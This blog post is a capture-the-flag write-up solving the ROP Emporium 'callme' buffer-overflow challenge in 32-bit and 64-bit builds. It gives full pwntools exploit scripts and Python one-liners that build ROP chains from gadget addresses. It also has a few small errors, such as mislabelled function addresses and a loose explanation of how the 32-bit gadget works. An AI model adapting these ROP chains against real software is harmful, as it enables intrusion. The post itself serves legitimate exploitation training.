---
layout: post
title: "ROP Emporium - Challenge 3: callme"
date: 2025-06-14
author: acfirth
categories: [BinaryExploitation, ROPEmporium]
tags: [Cybersecurity, Binary Exploitation, PWN, ROP Emporium, Buffer Overflow, ROP chain, callme]
---

## Contents
- [Challenge Brief](#challenge-brief)
- [x86 (32-bit) Binary Exploitation](#x86-32-bit-binary-exploitation)
    - [Binary Protections](#step-1-understanding-the-protections-on-the-binary)
    - [Disassembling the Binary](#step-2-disassembling-the-binary)
    - [Finding the Offset](#step-3-finding-the-offset)
    - [First Attempt at Writing the Exploit](#step-4-writing-the-unsuccessful-exploit)
    - [Locating Gadgets and Writing the New Exploit](#step-5-locating-the-gadgets-and-re-writing-the-exploit)

- [x86-64 (64-bit) Binary Exploitation](#x86-64-64-bit-binary-exploitation)
    - [Disassembling the Binary](#step-1-disassembling-the-binary)
    - [Finding the Offset](#step-2-finding-the-offset)
    - [Locating the Gadgets](#step-3-locating-the-gadgets)
    - [Writing the Exploit](#step-4-writing-the-exploit)

## Introduction
[ROP Emporium](https://ropemporium.com/) is a fantastic website containing **Binary Exploitation** challenges that focus on **Return Oriented Programming (ROP)** and building **ROP Chains** to exploit the binaries.

The challenges are offered in **x86 (32-bit)**, **x86-64 (64-bit)**, **ARMv5** and **MIPS**. I have been able to complete all of the 32-bit and 64-bit challenges, and I will be presenting my solutions and the exploitation path I followed to reach my solution.

In this post, I will be focussing on the second challenge: [**callme**](https://ropemporium.com/challenge/callme.html).

## Challenge Brief
*"Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table."*

*"You must call the `callme_one()`, `callme_two()` and `callme_three()` functions in that order, each with the arguments `0xdeadbeef`, `0xcafebabe`, `0xd00df00d` e.g. `callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)` to print the flag. For the `x86_64` binary double up those values, e.g. `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`"*

*"How do you make consecutive calls to a function from your ROP chain that won't crash afterwards? If you keep using the call instructions already present in the binary your chains will eventually fail, especially when exploiting 32 bit binaries. Consider why this might be the case. "*

## Exploitation Path
For both binary architectures, I am going to follow the same steps that I took in the first two challenges:

- Find what protections are on the binary
- Disassemble key parts of the binary
- Calculate the offset
- Locate the needed gadgets (if required)
- Write the exploit

## x86 (32-bit) Binary Exploitation
### Step 1: Understanding the Protections on the Binary
To understand the protections in place on the binary, I used the `checksec` tool from the `pwntools` module.

```
$ checksec ./callme32

[*] './callme32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    RUNPATH:    b'.'
    Stripped:   No
```

From the output, I saw that there was no **canary**, which is great as it makes exploiting **Buffer Overflows** much easier. **NX (No Execute)** is enabled meaning I cant just drop shellcode onto the stack and jump to it, which makes sense seeing as these challenges are based around building **ROP Chains**. **PIE (Position Independant Executable)** is not enabled, meaning memory addresses should stay the same every time the binary is run *(ignoring ASLR)*. Finally, the binary is not stripped meaning disassembling the binary is much easier.

### Step 2: Disassembling the Binary
```
$ objdump -d ./callme32

08048686 <main>:
 8048686:       8d 4c 24 04             lea    0x4(%esp),%ecx
 804868a:       83 e4 f0                and    $0xfffffff0,%esp
 804868d:       ff 71 fc                push   -0x4(%ecx)
 8048690:       55                      push   %ebp
 8048691:       89 e5                   mov    %esp,%ebp
 8048693:       51                      push   %ecx
 8048694:       83 ec 04                sub    $0x4,%esp
 8048697:       a1 3c a0 04 08          mov    0x804a03c,%eax
 804869c:       6a 00                   push   $0x0
 804869e:       6a 02                   push   $0x2
 80486a0:       6a 00                   push   $0x0
 80486a2:       50                      push   %eax
 80486a3:       e8 88 fe ff ff          call   8048530 <setvbuf@plt>
 80486a8:       83 c4 10                add    $0x10,%esp
 80486ab:       83 ec 0c                sub    $0xc,%esp
 80486ae:       68 20 88 04 08          push   $0x8048820
 80486b3:       e8 48 fe ff ff          call   8048500 <puts@plt>
 80486b8:       83 c4 10                add    $0x10,%esp
 80486bb:       83 ec 0c                sub    $0xc,%esp
 80486be:       68 37 88 04 08          push   $0x8048837
 80486c3:       e8 38 fe ff ff          call   8048500 <puts@plt>
 80486c8:       83 c4 10                add    $0x10,%esp
 80486cb:       e8 1d 00 00 00          call   80486ed <pwnme>
 80486d0:       83 ec 0c                sub    $0xc,%esp
 80486d3:       68 3c 88 04 08          push   $0x804883c
 80486d8:       e8 23 fe ff ff          call   8048500 <puts@plt>
 80486dd:       83 c4 10                add    $0x10,%esp
 80486e0:       b8 00 00 00 00          mov    $0x0,%eax
 80486e5:       8b 4d fc                mov    -0x4(%ebp),%ecx
 80486e8:       c9                      leave
 80486e9:       8d 61 fc                lea    -0x4(%ecx),%esp
 80486ec:       c3                      ret

080486ed <pwnme>:
 80486ed:       55                      push   %ebp
 80486ee:       89 e5                   mov    %esp,%ebp
 80486f0:       83 ec 28                sub    $0x28,%esp
 80486f3:       83 ec 04                sub    $0x4,%esp
 80486f6:       6a 20                   push   $0x20
 80486f8:       6a 00                   push   $0x0
 80486fa:       8d 45 d8                lea    -0x28(%ebp),%eax
 80486fd:       50                      push   %eax
 80486fe:       e8 3d fe ff ff          call   8048540 <memset@plt>
 8048703:       83 c4 10                add    $0x10,%esp
 8048706:       83 ec 0c                sub    $0xc,%esp
 8048709:       68 48 88 04 08          push   $0x8048848
 804870e:       e8 ed fd ff ff          call   8048500 <puts@plt>
 8048713:       83 c4 10                add    $0x10,%esp
 8048716:       83 ec 0c                sub    $0xc,%esp
 8048719:       68 6b 88 04 08          push   $0x804886b
 804871e:       e8 ad fd ff ff          call   80484d0 <printf@plt>
 8048723:       83 c4 10                add    $0x10,%esp
 8048726:       83 ec 04                sub    $0x4,%esp
 8048729:       68 00 02 00 00          push   $0x200
 804872e:       8d 45 d8                lea    -0x28(%ebp),%eax
 8048731:       50                      push   %eax
 8048732:       6a 00                   push   $0x0
 8048734:       e8 87 fd ff ff          call   80484c0 <read@plt>
 8048739:       83 c4 10                add    $0x10,%esp
 804873c:       83 ec 0c                sub    $0xc,%esp
 804873f:       68 6e 88 04 08          push   $0x804886e
 8048744:       e8 b7 fd ff ff          call   8048500 <puts@plt>
 8048749:       83 c4 10                add    $0x10,%esp
 804874c:       90                      nop
 804874d:       c9                      leave
 804874e:       c3                      ret

0804874f <usefulFunction>:
 804874f:       55                      push   %ebp
 8048750:       89 e5                   mov    %esp,%ebp
 8048752:       83 ec 08                sub    $0x8,%esp
 8048755:       83 ec 04                sub    $0x4,%esp
 8048758:       6a 06                   push   $0x6
 804875a:       6a 05                   push   $0x5
 804875c:       6a 04                   push   $0x4
 804875e:       e8 7d fd ff ff          call   80484e0 <callme_three@plt>
 8048763:       83 c4 10                add    $0x10,%esp
 8048766:       83 ec 04                sub    $0x4,%esp
 8048769:       6a 06                   push   $0x6
 804876b:       6a 05                   push   $0x5
 804876d:       6a 04                   push   $0x4
 804876f:       e8 dc fd ff ff          call   8048550 <callme_two@plt>
 8048774:       83 c4 10                add    $0x10,%esp
 8048777:       83 ec 04                sub    $0x4,%esp
 804877a:       6a 06                   push   $0x6
 804877c:       6a 05                   push   $0x5
 804877e:       6a 04                   push   $0x4
 8048780:       e8 6b fd ff ff          call   80484f0 <callme_one@plt>
 8048785:       83 c4 10                add    $0x10,%esp
 8048788:       83 ec 0c                sub    $0xc,%esp
 804878b:       6a 01                   push   $0x1
 804878d:       e8 7e fd ff ff          call   8048510 <exit@plt>
 8048792:       66 90                   xchg   %ax,%ax
 8048794:       66 90                   xchg   %ax,%ax
 8048796:       66 90                   xchg   %ax,%ax
 8048798:       66 90                   xchg   %ax,%ax
 804879a:       66 90                   xchg   %ax,%ax
 804879c:       66 90                   xchg   %ax,%ax
 804879e:       66 90                   xchg   %ax,%ax
```

From the output, I saw that the `main()` function calls the `pwnme()` function, as it does in the previous two challenges. The `pwnme()` function defines a buffer and uses the `read()` function to take input and write it into the buffer, which is where the **buffer overflow** vulnerability lies. Finally, the `usefulFunction()` simply calls the `callme_one()`, `callme_two()` and `callme_three()` functions. This is only done to ensure that the functions get linked properly.

**Address of the callme_one() Function:** `0xf7fbc63d`

**Address of the callme_two() Function:** `0xf7fbc755`

**Address of the callme_three() Function:** `0xf7fbc855`

### Step 3: Finding the Offset
I used `GDB-GEF` and the `pattern create` and `pattern offset` commands to find the offset before I overwrite the `EIP` register.

![GDB-GEF EIP Overwritten](/assets/images/ROP_Emporium/callme/finding_the_offset.png)

After the `EIP` register was overwritten, it caused a **Segmentation Fault** error which `GDB-GEF` caught and presented me with all of the information about the crash. I saw that the `EIP` was overwritten with the value `0x6161616c`, then the `pattern offset 0x6161616c` command calculated the offset was **44** bytes.

### Step 4: Writing the (Unsuccessful) Exploit
I first attempted to write an exploit script using `pwntools`. In the first attempt, I tried to pass the required arguments to each function using a 4-byte buffer between the function call and the arguments. This method *sometimes* works with other challenges, however in this challenge because I have to pass 3 arguments to each function and call the functions one after another, it fails with a **Segmentation Fault**.

```
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./callme32", checksec=False)
context.log_level = "CRITICAL"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)


# Exploitation code
offset = 44
buffer = b"A"*offset

arguments = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

callme_one = p32(0x080484f0)
callme_two = p32(0x08048550)
callme_thr = p32(0x080484e0)

payload = buffer 
payload += callme_one 
payload += b"A"*4 
payload += arguments
payload += callme_two
payload += b"A"*4
payload += arguments
payload += callme_thr
payload += b"A"*4
payload += arguments 

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

p.sendlineafter(b"> ", payload)
p.interactive()

# Close connection
p.close()
```

### Step 5: Locating the Gadgets and Re-Writing the Exploit
To solve this challenge, through a little bit of research, I found that I needed to pass the arguments to each function through registers as you would by default in an `x86-64` binary.

I needed to find a gadget in the binary that pops three registers that I can put each argument into. To do this, I used the tool `ropper`.

```
$ ropper -f ./callme32 --search "pop"

[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: ./callme32
0x080487fb: pop ebp; ret; 
0x080487f8: pop ebx; pop esi; pop edi; pop ebp; ret; 
0x080484ad: pop ebx; ret; 
0x080487fa: pop edi; pop ebp; ret; 
0x080487f9: pop esi; pop edi; pop ebp; ret; 
0x08048810: pop ss; add byte ptr [eax], al; add esp, 8; pop ebx; ret; 
0x080486ea: popal; cld; ret;
```

Theres one gadget that pops three registers before returning, `pop esi; pop edi; pop ebp; ret;`, located at the address `0x080487f9`.

So, now with the gadget, I built the new exploit using `pwntools`. I also wrote one-line exploits in Python2 and Python3.

#### The Pwntools Exploit
```
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./callme32", checksec=False)
context.log_level = "CRITICAL"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)


# Exploitation code
offset = 44
buffer = b"A"*offset

arguments = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

# The callme_* functions in the order: callme_one, callme_two, callme_three
callme_functions = [p32(0x080484f0), p32(0x08048550), p32(0x080484e0)]

pop_esi_edi_ebp = p32(0x080487f9)

payload = buffer
for func in callme_functions:
    payload += func
    # POP the registers
    payload += pop_esi_edi_ebp
    # Provide the arguments
    payload += arguments

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

p.sendlineafter(b"> ", payload)
p.interactive()

# Close connection
p.close()
```

Running the exploit with `python3 exploit.py`, I got the flag.
```
$ python3 exploit.py

Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```

#### Python2 One-Line Exploit
```
python2 -c 'print "A"*44 + "\xf0\x84\x04\x08" + "\xf9\x87\x04\x08" + "\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0" + "\x50\x85\x04\x08" + "\xf9\x87\x04\x08" + "\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0" + "\xe0\x84\x04\x08" + "\xf9\x87\x04\x08" + "\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0"'
```

I also made a shorter version to reduce the amount of re-used strings:
```
python2 -c 'print "A"*44 + "".join([func + "\xf9\x87\x04\x08" + "\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0" for func in ["\xf0\x84\x04\x08", "\x50\x85\x04\x08", "\xe0\x84\x04\x08"]])'
```

Running either of the commands, I get the output:
```
$ python2 -c 'print "A"*44 + "".join([func + "\xf9\x87\x04\x08" + "\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0" for func in ["\xf0\x84\x04\x08", "\x50\x85\x04\x08", "\xe0\x84\x04\x08"]])' | ./callme32

callme by ROP Emporium
x86

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```

#### Python3 One-Line Exploit
If you have read the previous writeups, you will know that Python3 prints byte strings differently to Python2, which tends to break binary exploits. So to get around this issue, I used the `sys.stdout.buffer.write()` function from the `sys` module.

```
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"".join([func + b"\xf9\x87\x04\x08" + b"\xef\xbe\xad\xde" + b"\xbe\xba\xfe\xca" + b"\x0d\xf0\x0d\xd0" for func in [b"\xf0\x84\x04\x08", b"\x50\x85\x04\x08", b"\xe0\x84\x04\x08"]]))'
```

Running this command, I got the flag:
```
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"".join([func + b"\xf9\x87\x04\x08" + b"\xef\xbe\xad\xde" + b"\xbe\xba\xfe\xca" + b"\x0d\xf0\x0d\xd0" for func in [b"\xf0\x84\x04\x08", b"\x50\x85\x04\x08", b"\xe0\x84\x04\x08"]]))' | ./callme32

callme by ROP Emporium
x86

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```

## x86-64 (64-bit) Binary Exploitation
The `x86-64` binary had the exact same protections as the `x86` binary, so I skipped that step.

### Step 1: Disassembling the Binary
The functions were the exact same as the `x86` binary, the only thing that differed were the memory addresses.

### Step 2: Finding the Offset
I again used `GDB-GEF` and the `pattern create` and `pattern offset` commands to generate a cyclic pattern and input it into the running binary to cause a crash.

![GDB-GEF RSP Overwritten](/assets/images/ROP_Emporium/callme/finding_the_offset_64-bit.png)

From the output, I saw that the `RSP` register pointed to a strings starting with `faaaaaaagaaaaaaa`. The `pattern offset faaaaaaagaaaaaaa` command calculated that the offset is **40** bytes.

### Step 3: Locating the Gadgets
When calling a function and passing arguments to it in `x86-64` binaries, the arguments are passed via the `RDI`, `RSI` and `RDX` registers. Therefore, I had to locate a gadget that would pop those three registers allowing me to put the required arguments into them.

I again used `ropper` for this.

```
$ ropper -f ./callme --search "pop"

[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: ./callme
0x000000000040099c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040099e: pop r13; pop r14; pop r15; ret; 
0x00000000004009a0: pop r14; pop r15; ret; 
0x00000000004009a2: pop r15; ret; 
0x00000000004007bb: pop rbp; mov edi, 0x601070; jmp rax; 
0x000000000040099b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040099f: pop rbp; pop r14; pop r15; ret; 
0x00000000004007c8: pop rbp; ret; 
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; 
0x00000000004009a3: pop rdi; ret; 
0x000000000040093e: pop rdx; ret; 
0x00000000004009a1: pop rsi; pop r15; ret; 
0x000000000040093d: pop rsi; pop rdx; ret; 
0x000000000040099d: pop rsp; pop r13; pop r14; pop r15; ret;
```

There's a perfect gadget, `pop rdi; pop rsi; pop rdx; ret;`, which pops the three registers before returning located at `0x000000000040093c`.

### Step 4: Writing the Exploit
After locating the required gadget, I moved onto writing the exploits. Again, writing one using `pwntools`, a one-line exploit in Python2, and a one-line exploit in Python3.

**Address of the callme_one() Function:** `0x400720`

**Address of the callme_one() Function:** `0x400740`

**Address of the callme_one() Function:** `0x4006f0`

**Address of the "POP RDI; POP RSI; POP RDX; RET" Gadget:** `0x000000000040093c`

**Arguments:** `0xdeadbeefdeadbeef`, `0xcafebabecafebabe`, and `0xd00df00dd00df00d`

#### The Pwntools Exploit
```
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./callme", checksec=False)
context.log_level = "CRITICAL"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
offset = 40
buffer = b"A"*offset

arguments = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)

# pop rdi; pop rsi; pop rdx; ret
pop_rdi_rsi_rdx = p64(0x000000000040093c)

# The callme_* functions in the order: callme_one, callme_two, and callme_three
callme_functions = [p64(0x400720), p64(0x400740), p64(0x4006f0)]

payload = buffer
for func in callme_functions:
    # POP the registers
    payload += pop_rdi_rsi_rdx
    # Provide the arguments
    payload += arguments
    # Call the function
    payload += func

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

p.sendlineafter(b"> ", payload)
p.interactive()

# Close connection
p.close()
```

Running the exploit, I got the output:
```
$ python3 exploit.py

Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```

#### Python2 One-Line Exploit
```
python2 -c 'print "A"*40 + "\x3c\x09\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0" + "\x20\x07\x40\x00\x00\x00\x00\x00" + "\x3c\x09\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0" + "\x40\x07\x40\x00\x00\x00\x00\x00" + "\x3c\x09\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0" + "\xf0\x06\x40\x00\x00\x00\x00\x00"'
```

The first Python2 one-line exploit is absolutely monstrous, so I also wrote a slightly shorter one.

```
python2 -c 'pop_args="\x3c\x09\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0"; print "A"*40 + "".join([pop_args + func for func in ["\x20\x07\x40\x00\x00\x00\x00\x00", "\x40\x07\x40\x00\x00\x00\x00\x00", "\xf0\x06\x40\x00\x00\x00\x00\x00"]])'
```

Running either of the commands, I got the output:
```
$ python2 -c 'pop_args="\x3c\x09\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0"; print "A"*40 + "".join([pop_args + func for func in ["\x20\x07\x40\x00\x00\x00\x00\x00", "\x40\x07\x40\x00\x00\x00\x00\x00", "\xf0\x06\x40\x00\x00\x00\x00\x00"]])'

callme by ROP Emporium
x86_64

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```

#### Python3 One-Line Exploit
```
python3 -c 'import sys; pop_args=b"\x3c\x09\x40\x00\x00\x00\x00\x00" + b"\xef\xbe\xad\xde\xef\xbe\xad\xde" + b"\xbe\xba\xfe\xca\xbe\xba\xfe\xca" + b"\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0"; sys.stdout.buffer.write(b"A"*40 + b"".join([pop_args + func for func in [b"\x20\x07\x40\x00\x00\x00\x00\x00", b"\x40\x07\x40\x00\x00\x00\x00\x00", b"\xf0\x06\x40\x00\x00\x00\x00\x00"]]))'
```

Running this command, I got the output:
```
$ python3 -c 'import sys; pop_args=b"\x3c\x09\x40\x00\x00\x00\x00\x00" + b"\xef\xbe\xad\xde\xef\xbe\xad\xde" + b"\xbe\xba\xfe\xca\xbe\xba\xfe\xca" + b"\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0"; sys.stdout.buffer.write(b"A"*40 + b"".join([pop_args + func for func in [b"\x20\x07\x40\x00\x00\x00\x00\x00", b"\x40\x07\x40\x00\x00\x00\x00\x00", b"\xf0\x06\x40\x00\x00\x00\x00\x00"]]))'

callme by ROP Emporium
x86_64

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```

**Success!** Both the x86 and x86-64 challenges have been solved!